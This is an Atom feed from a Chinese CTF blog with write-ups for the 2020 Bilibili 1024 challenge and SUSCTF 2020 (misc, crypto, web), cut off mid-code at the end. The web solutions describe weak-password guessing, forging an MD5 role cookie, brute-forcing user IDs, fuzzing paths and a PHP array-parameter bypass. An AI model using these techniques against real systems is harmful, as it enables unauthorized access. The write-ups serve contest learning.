<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Damya&#39;s Blog</title>
  
  <subtitle>あややこやや</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.damyahome.github.io/"/>
  <updated>2020-10-28T13:28:04.810Z</updated>
  <id>https://www.damyahome.github.io/</id>
  
  <author>
    <name>Damya</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020Bilibili解密赛</title>
    <link href="https://www.damyahome.github.io/ctf-writeup-web/ckwd913ai000mpwucurcf0xzq/2020Bilibili%E8%A7%A3%E5%AF%86%E8%B5%9B/"/>
    <id>https://www.damyahome.github.io/ctf-writeup-web/ckwd913ai000mpwucurcf0xzq/2020Bilibili%E8%A7%A3%E5%AF%86%E8%B5%9B/</id>
    <published>2020-10-28T13:27:21.000Z</published>
    <updated>2020-10-28T13:28:04.810Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://security.bilibili.com/sec1024/" target="_blank" rel="noopener">https://security.bilibili.com/sec1024/</a></p><h2 id="第一关-页面的背后是什么？"><a href="#第一关-页面的背后是什么？" class="headerlink" title="第一关  页面的背后是什么？"></a>第一关  页面的背后是什么？</h2><figure class="image-box">                <img src="https://images-cdn.shimo.im/wOna8FEMVS405N3i__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>查看源码有flag1和flag2的接口</p><p>flag1接口是 api/admin</p><p>访问就有flag</p><figure class="image-box">                <img src="https://images-cdn.shimo.im/d0TeMaQCaaPfZDTE__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag1{fe0cf087-8c3447bb-92c9cbca-1793c4cb}</p><p>flag2接口是 /api/ctf/2 ,采用get传参</p><p>修改UA:bilibili Security Browser</p><figure class="image-box">                <img src="https://images-cdn.shimo.im/1OuzkFDxyWgkAwsm__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag2{b8138188-0c16d0d5-7235c383-418dd144}</p><h2 id="第二关-真正的秘密只有特殊的设备才能看到"><a href="#第二关-真正的秘密只有特殊的设备才能看到" class="headerlink" title="第二关  真正的秘密只有特殊的设备才能看到"></a>第二关  真正的秘密只有特殊的设备才能看到</h2><figure class="image-box">                <img src="https://images-cdn.shimo.im/tpEYVrrI9kRnVTky__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag3接口是api/ctf/3</p><p>管理员 admin</p><p>密码盲猜弱口令 bilibili</p><figure class="image-box">                <img src="https://images-cdn.shimo.im/HLTD1syfg4kc1f1S__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag3{cddb6186-4bdd52ea-0623764d-99f9b62f}</p><h2 id="第三关-对不起，权限不足～"><a href="#第三关-对不起，权限不足～" class="headerlink" title="第三关  对不起，权限不足～"></a>第三关  对不起，权限不足～</h2><figure class="image-box">                <img src="https://images-cdn.shimo.im/OIN2BkTaufcyt3MX__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag4接口是api/ctf/4</p><p>只有window才有超级管理员的说法,即Administrator</p><p>抓包发现Cookie里有role变量,是个32位字符串,估计经过md5加密</p><figure class="image-box">                <img src="https://images-cdn.shimo.im/saRnJpEB1xeqvqd1__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>将Administrator加密后传入  7b7bc2512ee1fedcd76bdc68926d4f7b</p><figure class="image-box">                <img src="https://images-cdn.shimo.im/1eH8AwbMlcBylSgf__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag4{b5112a88-bb60c9e7-99935a1c-052fcc2e}</p><h2 id="第四关别人的秘密"><a href="#第四关别人的秘密" class="headerlink" title="第四关别人的秘密"></a>第四关别人的秘密</h2><figure class="image-box">                <img src="https://images-cdn.shimo.im/Wbf3oi5rQNp3kku8__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>查看源码,提取关键信息</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> uid = $.getUrlParam(<span class="string">'uid'</span>);</span><br><span class="line">            <span class="keyword">if</span> (uid == <span class="literal">null</span>) &#123;</span><br><span class="line">                uid = <span class="number">100336889</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $.ajax(&#123;</span><br><span class="line">                url: <span class="string">"api/ctf/5?uid="</span> + uid,</span><br><span class="line">                type: <span class="string">"get"</span>,</span><br><span class="line">                success:<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">              <span class="built_in">console</span>.log(data);</span><br><span class="line">              <span class="keyword">if</span> (data.code == <span class="number">200</span>)&#123;</span><br><span class="line">              <span class="comment">// 如果有值：前端跳转</span></span><br><span class="line">           $(<span class="string">'#flag'</span>).html(<span class="string">"欢迎超级管理员登陆～flag : "</span> + data.data )</span><br></pre></td></tr></table></figure><p>flag5接口是 api/ctf/5?uid=<br>role依旧为 7b7bc2512ee1fedcd76bdc68926d4f7b</p><p>意思应该是要从100336889开始爆破,我爆到的是100336919</p><figure class="image-box">                <img src="https://images-cdn.shimo.im/ICV7aTgqHYuEnLGW__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag5{f6c5ee82-af7a41b6-6f9314be-8625059a}</p><h2 id="第五关-结束亦是开始"><a href="#第五关-结束亦是开始" class="headerlink" title="第五关  结束亦是开始"></a>第五关  结束亦是开始</h2><figure class="image-box">                <img src="https://images-cdn.shimo.im/hS7WTPesfWA6SPei__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>根据题目意思访问 /blog/end.php</p><figure class="image-box">                <img src="https://images-cdn.shimo.im/7a9QEqPeHcS9p1o5__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>wfuzz一下文件</p><figure class="image-box">                <img src="https://images-cdn.shimo.im/8DzWwf049y7hVr4b__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>访问 /blog/test.php,得到一大段jsfuck</p><p>放到console输出</p><figure class="image-box">                <img src="https://images-cdn.shimo.im/Jwq0NvFpTFA2WkUP__original.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var str1 = &quot;\u7a0b\u5e8f\u5458\u6700\u591a\u7684\u5730\u65b9&quot;;</span><br><span class="line">//程序员最多的地方</span><br><span class="line">var str2 = &quot;bilibili1024havefun&quot;;</span><br><span class="line">console.log()</span><br></pre></td></tr></table></figure><p>在github上搜索相关信息,找到end.php的<a href="https://github.com/interesting-1024/end/blob/main/end.php" target="_blank" rel="noopener">源码</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//filename end.php</span></span><br><span class="line">$bilibili = <span class="string">"bilibili1024havefun"</span>;</span><br><span class="line">$str = intval($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$reg = preg_match(<span class="string">'/\d/is'</span>, $_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'id'</span>]) <span class="keyword">and</span> $reg !== <span class="number">1</span> <span class="keyword">and</span> $str === <span class="number">1</span>)&#123;</span><br><span class="line">$content = file_get_contents($_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="comment">//文件路径猜解</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"还差一点点啦～"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"你想要的不在这儿～"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>根据逻辑用数组绕过,即 id[]=1<br>flag6接口是 api/ctf/6</p><p>猜测为flag.txt</p><figure class="image-box">                <img src="https://images-cdn.shimo.im/MJEs8pad0i0T8Oji__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>访问图片地址/imgs/bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg</p><figure class="image-box">                <img src="https://images-cdn.shimo.im/OOtcvlBwOtfk1dOx__original.jpg" alt="图片" title class>                <p>图片</p>            </figure><p>用winhex打开,结尾有flag10?</p><figure class="image-box">                <img src="https://images-cdn.shimo.im/j7UJA5OsYb2ceuu3__original.png" alt="图片" title class>                <p>图片</p>            </figure><p>后面试了试url的参数接口可以是任意1-10数,flag.txt都在接口目录下</p><p>flag10{2ebd3b08-47ffc478-b49a5f9d-f6099d65}</p><h2 id="接下来的旅程-需要少年自己去探索啦～"><a href="#接下来的旅程-需要少年自己去探索啦～" class="headerlink" title="接下来的旅程 需要少年自己去探索啦～"></a>接下来的旅程 需要少年自己去探索啦～</h2><p>后面因为我是打完Byte和护网杯才来看的Bilibili,没多少时间做,开了个头就当有个参与感了</p><p>别的题的思路见<a href="https://www.zhihu.com/question/427113420/answers/updated+" target="_blank" rel="noopener">知乎</a>或Github</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://security.bilibili.com/sec1024/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://security.bilibili.com/sec1024/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;第一
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2020susctf_wp</title>
    <link href="https://www.damyahome.github.io/ctf-writeup/ckwd913ak000opwuc4co8m7tv/2020susctf-wp/"/>
    <id>https://www.damyahome.github.io/ctf-writeup/ckwd913ak000opwuc4co8m7tv/2020susctf-wp/</id>
    <published>2020-10-21T13:05:52.000Z</published>
    <updated>2020-10-21T13:13:30.006Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>得到号的时候只剩半天时间了,断断续续做了一些题,有些web题环境关了来不及复现,buu见</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>SUSCTF{Welcome_t0_SUSCTF}</p><h3 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h3><p>SUSCTF{Thank_y0u_fOr_your_r3ply}</p><h3 id="爆破鬼才请求出战"><a href="#爆破鬼才请求出战" class="headerlink" title="爆破鬼才请求出战"></a>爆破鬼才请求出战</h3><p>第一关,掩码爆破</p><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure><p>第二关,LSB隐写</p><figure class="image-box">                <img src="./3.png" alt="图片" title class>                <p>图片</p>            </figure><p>第三关,栅栏密码</p><p>S{urgdt1}UY_30__sS0a_04mc</p><figure class="image-box">                <img src="./4.png" alt="图片" title class>                <p>图片</p>            </figure><p>SUS{Y0u_ar3_g00d_4t_m1sc}</p><h3 id="签到之公众号"><a href="#签到之公众号" class="headerlink" title="签到之公众号"></a>签到之公众号</h3><p>SUSCTF{W3lc0m3_t0_SUSCTF}</p><h3 id="Dance-Dance"><a href="#Dance-Dance" class="headerlink" title="Dance_Dance"></a>Dance_Dance</h3><p>第一关,跳舞的小人密码</p><figure class="image-box">                <img src="./5.png" alt="图片" title class>                <p>图片</p>            </figure><p>根据<a href="https://www.dcode.fr/dancing-men-cipher" target="_blank" rel="noopener">在线网站</a>对出字符,举旗子的代表一个单词的结尾</p><figure class="image-box">                <img src="./6.png" alt="图片" title class>                <p>图片</p>            </figure><p>passwdLetU sdanCe</p><p>第二关,binwalk分离</p><figure class="image-box">                <img src="./7.png" alt="图片" title class>                <p>图片</p>            </figure><p>压缩包密码:LetUsdanCe</p><p>第三关,音频频谱二维码</p><figure class="image-box">                <img src="./8.png" alt="图片" title class>                <p>图片</p>            </figure><p>终究还是自己手画了出来</p><figure class="image-box">                <img src="./9.png" alt="图片" title class>                <p>图片</p>            </figure><p>SUS{1nt3r35t1nG_5p3ctRum}</p><h3 id="balɟ¯ʇuᴉɹԀ"><a href="#balɟ¯ʇuᴉɹԀ" class="headerlink" title="ƃɐlɟ¯ʇuᴉɹԀ"></a>ƃɐlɟ¯ʇuᴉɹԀ</h3><p>将十六进制数据倒序,得到一个zip</p><p>zip里有一个txt和加密压缩包,对txt进行字频分析</p><figure class="image-box">                <img src="./10.png" alt="图片" title class>                <p>图片</p>            </figure><p>Mima:D0youkNOw3dpr1nt?</p><p>根据文件内容用到 Cura_SteamEngine 4.6.2 软件</p><p>是我没有的硬件,告辞</p><h3 id="萌-你还好吗？"><a href="#萌-你还好吗？" class="headerlink" title="[萌]你还好吗？"></a>[萌]你还好吗？</h3><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">在线网站</a>解ook密码</p><figure class="image-box">                <img src="./11.png" alt="图片" title class>                <p>图片</p>            </figure><p>Ar3_y0u_OK??</p><p>解压缩包得到图片,提示不够高,winhex改下高度</p><figure class="image-box">                <img src="./12.png" alt="图片" title class>                <p>图片</p>            </figure><p>SUS{wuhu_y0u_f1nD_m3}</p><h3 id="萌-fix-fo"><a href="#萌-fix-fo" class="headerlink" title="[萌]fix_fo"></a>[萌]fix_fo</h3><p>拖进winhex修复文件头</p><figure class="image-box">                <img src="./13.png" alt="图片" title class>                <p>图片</p>            </figure><p>解压得到新佛曰密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新佛曰：諸隸殿僧降殿吽殿諸陀摩隸僧缽薩殿願心殿薩殿咤伏殿聞莊摩咤殿諦殿如叻須降闍殿亦修我殿愍殿諸隸殿波如空殿如如囑囑殿</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./14.png" alt="图片" title class>                <p>图片</p>            </figure><p>SUS{Ta1k_w1th_F0}</p><h3 id="抓住那只小老鼠"><a href="#抓住那只小老鼠" class="headerlink" title="抓住那只小老鼠"></a>抓住那只小老鼠</h3><p>第一关,zip伪加密,只有一个包是伪加密</p><figure class="image-box">                <img src="./15.png" alt="图片" title class>                <p>图片</p>            </figure><p>解压得到keyboard流量包,粗略看了下是键盘敲击码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">00:00:13:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:04:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:16:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:16:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:1a:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:12:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:15:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:07:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2c:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">02:00:00:00:00:00:00:00</span><br><span class="line">02:00:33:00:00:00:00:00</span><br><span class="line">02:00:00:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2c:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0f:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:20:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:18:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:22:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0f:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:27:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:27:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0e:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:21:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0b:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:20:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:15:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:1e:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0a:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0b:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:05:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:18:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:27:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:11:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./16.png" alt="图片" title class>                <p>图片</p>            </figure><p>password<space><space>l3t-u5-l00k-4t-th3-r1ght-butt0n</space></space></p><p>解不开那个压缩包,麻了</p><h3 id="emoji真好玩"><a href="#emoji真好玩" class="headerlink" title="emoji真好玩"></a>emoji真好玩</h3><p>根据文件名,是个jpg的jphs加密,密码在emoji里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">💸😲📓📓📀📧📰😫🐖👹🐛😫😥🐍📬📧😃🐡</span><br></pre></td></tr></table></figure><p>可以使用github上的<a href="https://github.com/pavelvodrazka/ctf-writeups/tree/master/hackyeaster2018/challenges/egg17/files/cracker" target="_blank" rel="noopener">脚本</a>解密<br><figure class="image-box">                <img src="./17.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>password:C0de3moj1</p><p>使用密码对图片进行解密</p><figure class="image-box">                <img src="./18.png" alt="图片" title class>                <p>图片</p>            </figure><p>得到一个01字符串,文件名说把它画出来,猜测是01字符串转二维码</p><p>根据开方为245*245的二维码,跑脚本得到二维码图片</p><figure class="image-box">                <img src="./19.png" alt="图片" title class>                <p>图片</p>            </figure><p>SUS{1p0ch_wanNA_4_npy5}</p><h3 id="小熊你咋带着品如的面具"><a href="#小熊你咋带着品如的面具" class="headerlink" title="小熊你咋带着品如的面具"></a>小熊你咋带着品如的面具</h3><p>看样子是要先取证iso再用获得的密码来用EncryptoforWin进行解密</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="简单-嘤语"><a href="#简单-嘤语" class="headerlink" title="[简单]嘤语"></a>[简单]嘤语</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">小Z在某站监听到一段加密对话：</span><br><span class="line">😳😊⬜😇😏🤐😖😋🤩🧐😏🤣😖🥺🤐🔑⬜🤣⬜😇😠🤣🤪🤪😳😇🤣😠⬜😇😳😖🥺😍😏⬜😳🤪⬜🤣⬜😋🤐😖😍⬜🤩😆⬜😇😳😖🥺😍😏⬜😋🥺🤣😋⬜😴🤣🤪⬜😘🤪😍🙃⬜🥺😳🤪😋🤩😏😳😇🤣😠😠🤐⬜😅😘😋⬜😊🤩😴⬜🥺🤣🤪⬜😆🤣😠😠😍😊🔑⬜😆🤩😏⬜😋🥺😍⬜😭🤩🤪😋⬜😖🤣😏😋🔑⬜😳😊😋🤩⬜🙃😳🤪😘🤪😍⭕⬜😳😊⬜😇🤩😊😋😏🤣🤪😋⬜😋🤩⬜😭🤩🙃😍😏😊⬜😇😏🤐😖😋🤩🧐😏🤣😖🥺😳😇⬜🤣😠🧐🤩😏😳😋🥺😭🤪🔑⬜😭🤩🤪😋⬜😇😠🤣🤪🤪😳😇🤣😠⬜😇😳😖🥺😍😏🤪⬜😇🤣😊⬜😅😍⬜😖😏🤣😇😋😳😇🤣😠😠🤐⬜😇🤩😭😖😘😋😍🙃⬜🤣😊🙃⬜🤪🤩😠😮😍🙃⬜😅🤐⬜🥺🤣😊🙃⭕⬜🥺🤩😴😍😮😍😏🔑⬜😋🥺😍🤐⬜🤣😏😍⬜🤣😠🤪🤩⬜😘🤪😘🤣😠😠🤐⬜😮😍😏🤐⬜🤪😳😭😖😠😍⬜😋🤩⬜😅😏😍🤣😷⬜😴😳😋🥺⬜😭🤩🙃😍😏😊⬜😋😍😇🥺😊🤩😠🤩🧐🤐⭕⬜😋🥺😍⬜😋😍😏😭⬜😳😊😇😠😘🙃😍🤪⬜😋🥺😍⬜🤪😳😭😖😠😍⬜🤪🤐🤪😋😍😭🤪⬜😘🤪😍🙃⬜🤪😳😊😇😍⬜🧐😏😍😍😷⬜🤣😊🙃⬜😏🤩😭🤣😊⬜😋😳😭😍🤪🔑⬜😋🥺😍⬜😍😠🤣😅🤩😏🤣😋😍⬜😏😍😊🤣😳🤪🤪🤣😊😇😍⬜😇😳😖🥺😍😏🤪🔑⬜😴🤩😏😠🙃⬜😴🤣😏⬜😳😳⬜😇😏🤐😖😋🤩🧐😏🤣😖🥺🤐⬜🤪😘😇🥺⬜🤣🤪⬜😋🥺😍⬜😍😊😳🧐😭🤣⬜😭🤣😇🥺😳😊😍⬜🤣😊🙃⬜😅😍🤐🤩😊🙃⭕⬜🥺😍😏😍⬜😳🤪⬜🤐🤩😘😏⬜😆😠🤣🧐☯⬜🤪😘🤪😇😋😆🌘😍🤣🤪🤐⛔😏😍😖😠🤣😇😍⛔😇😏🤐😖😋🤩🌒⭕</span><br><span class="line">经过大量尝试，小Z勉强还原出一些特殊字符：</span><br><span class="line">⭕ =&gt; .</span><br><span class="line">☯ =&gt; :</span><br><span class="line">🔑 =&gt; ,</span><br><span class="line">⛔ =&gt; _</span><br><span class="line">🌘 =&gt; &#123;</span><br><span class="line">🌒 =&gt; &#125;</span><br><span class="line">你能帮帮他吗？</span><br><span class="line">注：flag均为大写</span><br></pre></td></tr></table></figure><p>找到了<a href="https://apps.timwhitlock.info/emoji/tables/unicode" target="_blank" rel="noopener">编码表</a>和<a href="https://apps.timwhitlock.info/unicode/inspect" target="_blank" rel="noopener">解密网站</a>,但这题用不到<br>这题纯粹靠英语来猜,比如最后这一段应该是flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">🤪😘🤪😇😋😆</span><br><span class="line">SUSCTF</span><br><span class="line">🌘😍🤣🤪🤐⛔😏😍😖😠🤣😇😍⛔😇😏🤐😖😋🤩🌒</span><br><span class="line">SUSCTF&#123;**S*_*****C*_C***T*&#125;</span><br></pre></td></tr></table></figure><p>又比如英语中比较常见的THE,IS等,根据已知的emoji和语句意进行猜测<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">😋🥺😍</span><br><span class="line">THE</span><br><span class="line">😳🤪</span><br><span class="line">IS</span><br><span class="line">😆😠🤣🧐☯</span><br><span class="line">FLAG:</span><br><span class="line">😋🥺😍🤐</span><br><span class="line">THEY</span><br><span class="line">😋🤐😖😍</span><br><span class="line">TYPE</span><br><span class="line">更新后的flag</span><br><span class="line">SUSCTF&#123;EASY_REPLACE_CRYPTE&#125;</span><br></pre></td></tr></table></figure></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign_in"></a>Sign_in</h3><p>抓包改post传参</p><figure class="image-box">                <img src="./20.png" alt="图片" title class>                <p>图片</p>            </figure><p>SUSCTF{397d79b4fd5bb85d73d86742dfdf223d}</p><h3 id="AT-Field"><a href="#AT-Field" class="headerlink" title="AT_Field"></a>AT_Field</h3><p>修改可以输入的字符长度,输入flag并提交</p><figure class="image-box">                <img src="./21.png" alt="图片" title class>                <p>图片</p>            </figure><p>SUSCTF{0e808712e2a814fe0cd126e09159226a}</p><h3 id="Script-Kiddle"><a href="#Script-Kiddle" class="headerlink" title="Script_Kiddle"></a>Script_Kiddle</h3><p>抓个包爆破,需要缘分</p><figure class="image-box">                <img src="./22.png" alt="图片" title class>                <p>图片</p>            </figure><p>SUSCTF{24bf10b0f61c19e10a631e4c603127b2}</p><h3 id="first-lesson"><a href="#first-lesson" class="headerlink" title="first_lesson"></a>first_lesson</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 